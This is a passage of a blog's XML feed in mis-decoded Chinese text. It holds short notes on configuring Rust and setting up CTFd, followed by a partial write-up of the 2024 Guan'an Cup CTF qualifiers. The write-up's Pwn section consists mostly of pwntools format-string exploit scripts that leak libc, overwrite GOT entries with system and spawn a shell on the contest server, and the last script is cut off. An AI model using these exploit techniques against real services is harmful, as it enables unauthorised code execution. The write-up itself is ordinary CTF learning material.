src="/2024/09/19/%E9%85%8D%E7%BD%AERust%E7%8E%AF%E5%A2%83/1696415970899-506210c4-87fc-4e30-9f43-bc336e053699.png" class="" title="img"><p>è¿™æ ·å°±å®Œæˆäº†</p>]]></content>
    
    
    <categories>
      
      <category>ç¯å¢ƒé…ç½®</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ç®€å•æ­å»ºCTFd</title>
    <link href="/2024/09/16/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BACTFd/"/>
    <url>/2024/09/16/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BACTFd/</url>
    
    <content type="html"><![CDATA[<p>æäº†ä¸€æ™šä¸Šï¼Œubuntuä¸Šå‘½ä»¤å¤åˆ¶ä¸äº†ï¼Œéº»çƒ¦ã€‚æœkaliçš„æ•™ç¨‹ï¼Œdocker-composeä¸èƒ½æ­£å¸¸ä½¿ç”¨ï¼Œä¼°è®¡æ˜¯è®¾ç½®äº†python2æœ‰é—®é¢˜ï¼Œä¸€ç›´è­¦å‘Šï¼Œè¿˜æ˜¯å…ˆpull docker</p><p><a href="https://www.bilibili.com/read/cv16948927/">https://www.bilibili.com/read/cv16948927/</a></p><h1 id="CTFd"><a href="#CTFd" class="headerlink" title="CTFd"></a>CTFd</h1><p>å®‰è£…docker</p><img src="/2024/09/16/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BACTFd/1694661434139-2bb68ae4-07d2-4e3e-bf5c-a6519df585ae.png" class="" title="img"><p>å¯åŠ¨docker</p><img src="/2024/09/16/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BACTFd/1694661452074-0cdea229-ffda-4647-9a99-40dcb39e3c1d.png" class="" title="img"><p>pull é•œåƒ</p><img src="/2024/09/16/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BACTFd/1694661496732-122cff23-0e9f-40f9-ae92-0ea8fc8895cc.png" class="" title="img"><p>å¯åŠ¨å®¹å™¨</p><img src="/2024/09/16/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BACTFd/1694661527389-4538ed6e-2298-4568-ab74-5e4fc1c0b84d.png" class="" title="img"><p>è™šæ‹Ÿæœºå†…å¯åŠ¨</p><img src="/2024/09/16/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BACTFd/1694661552024-5545993b-44c7-4078-a114-bdf832cd323a.png" class="" title="img"><p>æ³¨æ„ç«¯å£</p><img src="/2024/09/16/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BACTFd/1694661572673-8ee28ee4-7540-4dbc-9574-d47517593ba1.png" class="" title="img"><p>æ˜ å°„åˆ°æœ¬åœ°</p><img src="/2024/09/16/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BACTFd/1694661587448-c9faa948-f9b2-4dd5-b439-8e7de93b9cf8.png" class="" title="img">]]></content>
    
    
    <categories>
      
      <category>ç¯å¢ƒé…ç½®</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>è§‚å®‰æ¯2024åˆèµ›éƒ¨åˆ†wp</title>
    <link href="/2024/08/20/%E8%A7%82%E5%AE%89%E6%9D%AF2024%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/"/>
    <url>/2024/08/20/%E8%A7%82%E5%AE%89%E6%9D%AF2024%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/</url>
    
    <content type="html"><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="office"><a href="#office" class="headerlink" title="office"></a>office</h2><p>æŸ¥çœ‹å¤‡æ³¨è·å¾—å¯†ç </p><img src="/2024/08/20/%E8%A7%82%E5%AE%89%E6%9D%AF2024%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1724165709865-3b1df1b7-2d1b-4bbd-b149-849364624885.png" class="" title="img"><p>å‡çš„flagï¼Œæ—¢ç„¶æ˜¯officeçš„é¢˜è‚¯å®šæƒ³åˆ°å® </p><img src="/2024/08/20/%E8%A7%82%E5%AE%89%E6%9D%AF2024%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1724166172541-ccc55ae4-549f-42a0-a1ca-073bb1eac996.png" class="" title="img"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python ./olevba.py <span class="hljs-string">&quot;E:\CTF_Attachments\Guan_an_bei\Misc\office\problem.xlsm&quot;</span> -p I<span class="hljs-comment">#ziTxnxvbg#GC9</span><br></code></pre></td></tr></table></figure><p>å‘ç°æ˜¯ä¸ªrc4</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python">Function Check(user_enc)<br>    Encrypted = <span class="hljs-string">&quot;184,116,232,38,216,127,29,89,225,84,108,82,8,0,161,49,232,127,45,252,147,140,185,210,26,107,123,2,82,189,0,167,205,130,94,54,94,242,138,139,102,79,250,139,9,142,17,42,198,113,246,6,142,31,&quot;</span><br><br>    If (user_enc &lt;&gt; Encrypted) Then<br>        Check = <span class="hljs-literal">False</span><br>    Else<br>        Check = <span class="hljs-literal">True</span><br>    End If<br>End Function<br><br>Private Sub Worksheet_Change(ByVal Target As Range)<br>    If Not Intersect(Target, Me.Range(<span class="hljs-string">&quot;B2&quot;</span>)) Is Nothing Then<br>        If Check(crypto(Target.Value)) Then<br>            Me.Range(<span class="hljs-string">&quot;C2&quot;</span>).Value = <span class="hljs-string">&quot;success&quot;</span><br>            Me.Range(<span class="hljs-string">&quot;C2&quot;</span>).Interior.Color = RGB(<span class="hljs-number">232</span>, <span class="hljs-number">245</span>, <span class="hljs-number">233</span>)<br>        Else<br>            Me.Range(<span class="hljs-string">&quot;C2&quot;</span>).Value = <span class="hljs-string">&quot;fail&quot;</span><br>            Me.Range(<span class="hljs-string">&quot;C2&quot;</span>).Interior.Color = RGB(<span class="hljs-number">251</span>, <span class="hljs-number">233</span>, <span class="hljs-number">231</span>)<br>        End If<br>    End If<br>End Sub<br><br><br>Function crypto(sMessage)<br>    Dim kLen, x, y, i, j, temp<br>    Dim s(<span class="hljs-number">256</span>)<br><br>    For i = <span class="hljs-number">0</span> To <span class="hljs-number">255</span><br>        s(i) = i<br>    Next<br><br>    j = <span class="hljs-number">0</span><br>    For i = <span class="hljs-number">0</span> To <span class="hljs-number">255</span><br>        j = (j + s(i)) Mod <span class="hljs-number">256</span><br>        temp = s(i)<br>        s(i) = s(j)<br>        s(j) = temp<br>    Next<br><br>    x = <span class="hljs-number">0</span><br>    y = <span class="hljs-number">0</span><br>    For i = <span class="hljs-number">1</span> To Len(sMessage)<br>        x = (x + <span class="hljs-number">1</span>) Mod <span class="hljs-number">256</span><br>        y = (y + s(x)) Mod <span class="hljs-number">256</span><br>        temp = s(x)<br>        s(x) = s(y)<br>        s(y) = temp<br><br>        crypto = crypto &amp; (s((s(x) + s(y)) Mod <span class="hljs-number">256</span>) Xor Asc(Mid(sMessage, i, <span class="hljs-number">1</span>))) &amp; <span class="hljs-string">&quot;,&quot;</span><br>    Next<br>End Function<br></code></pre></td></tr></table></figure><p>æ— å¯†ç é»˜è®¤é•¿åº¦ä¸ºdataï¼Œå…¨æ˜¯0ï¼Œæ ¼å¼ä¸ºhex</p><img src="/2024/08/20/%E8%A7%82%E5%AE%89%E6%9D%AF2024%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1724047158560-9382a41c-67f0-40fd-b7ce-99c80d2fb591.png" class="" title="img"><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="rev-shell"><a href="#rev-shell" class="headerlink" title="rev_shell"></a>rev_shell</h2><p>ç»™äº†ä¸€ä¸ªelfå’Œlogæ–‡ä»¶</p><img src="/2024/08/20/%E8%A7%82%E5%AE%89%E6%9D%AF2024%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1724060088208-33e3df77-9147-4ad3-a499-2bf0731fa013.png" class="" title="img"><p>elfæœ‰å£³ä¸€ç›´è„±ä¸äº†</p><img src="/2024/08/20/%E8%A7%82%E5%AE%89%E6%9D%AF2024%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1724060197790-444a8f91-32b2-4ba7-a124-b8745c440fa8.png" class="" title="img"><p>logæ–‡ä»¶æç¤ºå»ç»ˆç«¯å°è¯•è¾“å…¥ï¼Œkeyå·²çŸ¥ï¼Œencä¹‹åè¾“å…¥æ˜æ–‡å°±èƒ½å¾—åˆ°å¯†æ–‡</p><p>å°è¯•ä¼ ä¸€äº›æ•°å­—å’Œå­—æ¯ï¼Œä¼ å…¥flagæ ¼å¼å‘ç°æ˜æ–‡å¯¹ä¸€ä½å¯†æ–‡ä¹Ÿå¯¹ä¸€ä½ï¼Œé‚£å°±ç›´æ¥çˆ†ç ´</p><img src="/2024/08/20/%E8%A7%82%E5%AE%89%E6%9D%AF2024%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1724067765724-bf40bed7-b2db-4136-a827-48c29fede541.png" class="" title="img"><p>å¯æƒœå†™è„šæœ¬è¿˜æ˜¯æ…¢äº†ï¼Œæ¯”èµ›å®Œååˆ†é’Ÿæ‰å‡ºğŸ¥²</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> ast<br><span class="hljs-comment">#from LibcSearcher import *</span><br><br>filename=<span class="hljs-string">&#x27;./encsh&#x27;</span><br>elf = ELF(filename)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>context(arch = elf.arch,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gdb</span>():<br>    gdb.attach(io)<br>    pause(<span class="hljs-number">1</span>)   <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br><span class="hljs-comment">#return u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="hljs-keyword">return</span> u32(io.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br><br>a=[<span class="hljs-number">227</span>, <span class="hljs-number">83</span>, <span class="hljs-number">162</span>, <span class="hljs-number">17</span>, <span class="hljs-number">197</span>, <span class="hljs-number">102</span>, <span class="hljs-number">127</span>, <span class="hljs-number">119</span>, <span class="hljs-number">94</span>, <span class="hljs-number">208</span>, <span class="hljs-number">82</span>, <span class="hljs-number">187</span>, <span class="hljs-number">221</span>, <span class="hljs-number">191</span>, <span class="hljs-number">112</span>, <span class="hljs-number">186</span>, <span class="hljs-number">0</span>, <span class="hljs-number">170</span>, <span class="hljs-number">191</span>, <span class="hljs-number">44</span>, <span class="hljs-number">233</span>, <span class="hljs-number">242</span>, <span class="hljs-number">209</span>, <span class="hljs-number">114</span>, <span class="hljs-number">70</span>, <span class="hljs-number">116</span>, <span class="hljs-number">203</span>, <span class="hljs-number">80</span>, <span class="hljs-number">72</span>, <span class="hljs-number">65</span>, <span class="hljs-number">254</span>, <span class="hljs-number">111</span>, <span class="hljs-number">119</span>, <span class="hljs-number">146</span>, <span class="hljs-number">95</span>, <span class="hljs-number">180</span>, <span class="hljs-number">182</span>, <span class="hljs-number">77</span>, <span class="hljs-number">140</span>, <span class="hljs-number">110</span>, <span class="hljs-number">204</span>, <span class="hljs-number">249</span>, <span class="hljs-number">76</span>, <span class="hljs-number">34</span>, <span class="hljs-number">229</span>, <span class="hljs-number">39</span>, <span class="hljs-number">30</span>, <span class="hljs-number">12</span>, <span class="hljs-number">248</span>, <span class="hljs-number">89</span>, <span class="hljs-number">158</span>, <span class="hljs-number">103</span>, <span class="hljs-number">170</span>]<br><br>s1=<span class="hljs-string">&#x27;&#x27;</span><br>ch=<span class="hljs-string">&quot;I0123456789abcdefghijklmnopqrstuvwxyz_+=\[!\]#$%^&amp;*ABCDEFGHJKLMNOP@QRSTUVWXYZ`&#125;&#123;\|\&quot;&#x27;;:?/ \^,.~&quot;</span><br>s2=<span class="hljs-string">&#x27;&#x27;</span><br>io = process(filename)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">52</span>):<br>s2=s1<br><span class="hljs-keyword">for</span>  j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(ch)):<br>sl(<span class="hljs-string">&#x27;key&#x27;</span>)<br>sl(<span class="hljs-string">&#x27;mykeymykeyhackergoawayyourkeyyou&#x27;</span>)<br>sl(<span class="hljs-string">&#x27;enc&#x27;</span>)<br>s2+=ch[j]<br>sl(s2)<br>ru(<span class="hljs-string">&#x27;&gt; &gt; &#x27;</span>)<br>result=io.recvline()<br><br>result_str = result.decode()<br><br>numbers = re.findall(<span class="hljs-string">r&#x27;\d+&#x27;</span>, result_str)<br><br>numbers_list = [<span class="hljs-built_in">int</span>(num) <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> numbers]<br><br><span class="hljs-built_in">print</span>(numbers_list)<br><span class="hljs-keyword">if</span> numbers_list[i]==a[i]:<br>s1+=ch[j]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;s1=&quot;</span>,s1)<br><span class="hljs-comment">#io.close()</span><br><span class="hljs-keyword">break</span><br><span class="hljs-keyword">else</span>:<br>s2=s1<br></code></pre></td></tr></table></figure><img src="/2024/08/20/%E8%A7%82%E5%AE%89%E6%9D%AF2024%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1724060288313-5888c98a-d2b2-4a20-b212-ee761ac86306.png" class="" title="img"><p>èµ›åå¸ˆå‚…ç»™äº†ä¸€ä¸ªæ€è·¯</p><img src="/2024/08/20/%E8%A7%82%E5%AE%89%E6%9D%AF2024%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1724316893052-2b8e8a2a-c4d0-4e6a-aa11-c67f68708e95.png" class="" title="img"><p>ä¸Šé¢continueä¹‹åå†å»å¯¼å‡º</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tcl"><span class="hljs-keyword">info</span> <span class="hljs-keyword">proc</span><span class="hljs-title"> mappings</span><br>dump<span class="hljs-title"> memory</span> dumped 0x7ffff7f70000 0x7ffff7fd2000<br></code></pre></td></tr></table></figure><img src="/2024/08/20/%E8%A7%82%E5%AE%89%E6%9D%AF2024%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1724316960490-9bb18e98-5137-49eb-95dc-0f2bfab55eb6.png" class="" title="img"><p>è„±å®Œå£³åèƒ½æ‹¿åˆ°GoLangç¨‹åºï¼Œç®—äº†ç›´æ¥çˆ†ç ´è‚¯å®šæœ€å¿«</p><img src="/2024/08/20/%E8%A7%82%E5%AE%89%E6%9D%AF2024%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1724317073668-773acece-7b40-4d16-9632-51b3ffd0d616.png" class="" title="img"><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="reject-dollor-1"><a href="#reject-dollor-1" class="headerlink" title="reject_dollor-1"></a>reject_dollor-1</h2><p>è¿‡æ»¤äº†$ï¼Œè¾“å…¥0x100ï¼Œå¯ä»¥å¤šä¸ª%pæ³„éœ²</p><img src="/2024/08/20/%E8%A7%82%E5%AE%89%E6%9D%AF2024%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1724204039723-93132413-0b1e-483d-9fd0-866ff2f99ef1.png" class="" title="img"><p>å†’æ³¡æ’åºä¼šæ‰“ä¹±è¾“å…¥ï¼Œ\nç»•è¿‡</p><img src="/2024/08/20/%E8%A7%82%E5%AE%89%E6%9D%AF2024%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1724203955867-d79e0ec6-79f2-41e6-80b4-09fc6090824f.png" class="" title="img"><p>æ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œæ³„éœ²libcä¹‹åæŠŠputsæ”¹ä¸ºsystemï¼Œç„¶åä¼ sh;</p><img src="/2024/08/20/%E8%A7%82%E5%AE%89%E6%9D%AF2024%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1724204090161-65d11b20-cafd-4aa3-b224-ae30a0f7ba75.png" class="" title="img"><p>ç¬¬ä¸€ä¸ªæ˜¯libcï¼Œåç§»æ˜¯0x29d90</p><img src="/2024/08/20/%E8%A7%82%E5%AE%89%E6%9D%AF2024%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1724227665626-0118fe15-9093-4bbb-a223-3e51b221467d.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;isg.idss-cn.com&quot;</span>,<span class="hljs-number">24232</span>)<br><span class="hljs-comment">#p = process(&quot;./pwn&quot;)</span><br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inpt</span>(<span class="hljs-params">content</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;e &gt; &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;ge &gt; &quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">printf</span>():<br>    p.sendlineafter(<span class="hljs-string">&quot;e &gt; &quot;</span>, <span class="hljs-string">&quot;2&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">puts</span>():<br>    p.sendlineafter(<span class="hljs-string">&quot;e &gt; &quot;</span>, <span class="hljs-string">&quot;3&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    inpt(<span class="hljs-string">&quot;\n&quot;</span>+<span class="hljs-string">&quot;%d&quot;</span>*<span class="hljs-number">42</span>+<span class="hljs-string">&quot;.%p.&quot;</span>)<br>    printf()<br>    p.recvuntil(<span class="hljs-string">&quot;.&quot;</span>)<br>    libc.address = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">&quot;.&quot;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)-<span class="hljs-number">0x29d90</span><br>    addr1 = (libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>] &amp; <span class="hljs-number">0xffff</span>) - <span class="hljs-number">0x21</span><span class="hljs-comment">#è¿™é‡Œå˜æˆ0x11ï¼Œä¸‹é¢è·Ÿç€å˜ä¹Ÿæ²¡å•¥é—®é¢˜</span><br>    addr2 = ((libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xffff</span>)-(libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]&amp;<span class="hljs-number">0xffff</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;libc:&#x27;</span>,<span class="hljs-built_in">hex</span>(libc.address))<br>    snd = <span class="hljs-string">b&#x27;\n&#x27;</span>+<span class="hljs-string">b&#x27;%c&#x27;</span>*<span class="hljs-number">0x20</span>+<span class="hljs-string">b&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(addr1).encode()+<span class="hljs-string">b&#x27;c%hn%&#x27;</span>+<span class="hljs-built_in">str</span>(addr2).encode()+<span class="hljs-string">b&#x27;c%hn&#x27;</span><br>    snd = snd.ljust((<span class="hljs-number">0x22</span>-<span class="hljs-number">8</span>)*<span class="hljs-number">8</span>)+p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>    snd = snd.ljust((<span class="hljs-number">0x24</span>-<span class="hljs-number">8</span>)*<span class="hljs-number">8</span>)+p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]+<span class="hljs-number">2</span>)<br>    inpt(snd)<br>    printf()<br>    inpt(<span class="hljs-string">&quot;sh;&quot;</span>)<br>    puts()<br>    p.interactive()<br><br>pwn()<br></code></pre></td></tr></table></figure><p>æ³„éœ²putsçœŸå®åœ°å€ç„¶åæ ¼å¼åŒ–å­—ç¬¦ä¸²ä¿®æ”¹ï¼Œæ€è·¯æ²¡é—®é¢˜å°±æ˜¯ä¸çŸ¥é“ä¸ºå•¥æ‰“ä¸é€š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context.arch=elf.arch<br><br><span class="hljs-comment">#io=process(&#x27;./pwn&#x27;)</span><br><span class="hljs-comment"># libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br>io=remote(<span class="hljs-string">&#x27;isg.idss-cn.com&#x27;</span>,<span class="hljs-string">&#x27;24232&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">choice</span>(<span class="hljs-params">a</span>):<br>  io.sendlineafter(<span class="hljs-string">&#x27;Enter your choice &gt; &#x27;</span>,<span class="hljs-built_in">str</span>(a))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a</span>):<br>  choice(<span class="hljs-number">1</span>)<br>  io.sendafter(<span class="hljs-string">&#x27; &gt; &#x27;</span>,a)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gitf</span>():<br>  choice(<span class="hljs-number">2</span>)<br><br>pay=<span class="hljs-string">&#x27;\n&#x27;</span>+<span class="hljs-string">&#x27;%c&#x27;</span>*(<span class="hljs-number">15</span>)+<span class="hljs-string">&#x27;%s&#x27;</span><br>pay=pay.ljust(<span class="hljs-number">0x40</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)+p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>add(pay)<br>gitf()<br><br>libc_base=u64(io.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:]+<span class="hljs-string">&#x27;\x00\x00&#x27;</span>)-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>libc.address=libc_base<br>system_addr=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br><span class="hljs-comment">#gdb.attach(io)</span><br><br>arg0=(system_addr)&amp;<span class="hljs-number">0xffff</span><br>arg1=(system_addr&amp;<span class="hljs-number">0xffff0000</span>)&gt;&gt;<span class="hljs-number">16</span><br>arg2=(system_addr&amp;<span class="hljs-number">0xffff00000000</span>)&gt;&gt;<span class="hljs-number">32</span><br><br>pay=<span class="hljs-string">&#x27;\nsh;&#x27;</span>+<span class="hljs-string">&#x27;%c&#x27;</span>*(<span class="hljs-number">14</span>)+<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(arg0-<span class="hljs-number">18</span>)+<span class="hljs-string">&#x27;c%hn%&#x27;</span>+<span class="hljs-built_in">str</span>((arg1-arg0+<span class="hljs-number">0x10000</span>)%<span class="hljs-number">0x10000</span>)+<span class="hljs-string">&#x27;c%hn%&#x27;</span>+<span class="hljs-built_in">str</span>((arg2-arg1+<span class="hljs-number">0x10000</span>)%<span class="hljs-number">0x10000</span>)+<span class="hljs-string">&#x27;c%hn&#x27;</span><br>pay=pay.ljust(<span class="hljs-number">0x40</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>  pay+=p64(elf.got[<span class="hljs-string">&#x27;memset&#x27;</span>]+i*<span class="hljs-number">2</span>)+p64(<span class="hljs-number">0</span>)<br><br>add(pay)<br>gitf()<br><span class="hljs-comment"># io.sendline(&#x27;3&#x27;)</span><br><br>success(<span class="hljs-string">&#x27;libc_base:&#x27;</span>+<span 